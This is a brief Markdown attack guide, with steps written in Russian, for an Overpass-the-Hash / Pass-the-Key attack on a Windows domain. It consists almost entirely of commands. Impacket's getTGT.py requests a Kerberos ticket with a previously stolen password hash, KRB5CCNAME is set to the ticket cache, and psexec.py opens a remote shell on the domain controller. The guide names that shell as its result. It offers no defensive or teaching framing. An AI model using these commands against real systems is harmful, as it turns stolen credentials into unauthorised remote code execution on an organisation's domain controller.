# **Overpass The Hash/Pass The Key (PTK)**

**Overpass The Hash/Pass The Key (PTK) attack guide**

**Инструкция:**

- Используем ранее полученный хэш пароля.

`# python3 getTGT.py <domain.net>/<username> -hashes :<hash>`

- Получаем удаленный доступ к консоли атакуемой машины.

`# export KRB5CCNAME = <ccache_file>`

`# python3 psexec.py <domain.net>/<username>@<ip_of_dc>`


**Результат:**

Шелл на атакуемой машине.
